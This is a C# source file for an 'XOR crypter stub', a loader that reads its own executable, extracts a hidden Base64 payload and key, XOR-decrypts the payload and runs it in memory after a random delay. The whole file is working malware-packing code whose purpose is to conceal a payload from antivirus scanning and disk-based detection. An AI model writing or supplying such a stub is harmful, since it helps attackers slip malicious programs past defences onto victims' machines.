using System;
using System.Security.Cryptography;
using System.Threading;
using System.Reflection;
using System.Text.RegularExpressions;
using System.IO;
using System.Collections.Generic;
using System.Text;

namespace XOR_crypter_stub
{

    internal class Program
    {
        static void Main(string[] args)
        {
            Thread.Sleep(new Random(Environment.TickCount).Next(100, 500));
            string ins = File.ReadAllText(Assembly.GetEntryAssembly().Location); //=data
            string kode = new Regex("ssdfsfgvdfju.*ssdfsfgvdfju").Matches(ins)[0].Value.Replace("ssdfsfgvdfju", "");
            string Data = Regex.Split(ins, "ssdfsfgvdfju")[2];//=file
            Assembly asm = Assembly.Load(decryptBytes(Convert.FromBase64String(Data), kode)); //=assembly
            asm.EntryPoint.Invoke(null, new object[] { new string[] { } });
        }

        private static byte[] decryptBytes(byte[] bytes, String pass)
        {
            byte[] XorBytes = Encoding.Unicode.GetBytes(pass);

            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] ^= XorBytes[i % 16];
            }

            return bytes;
        }
    }


}


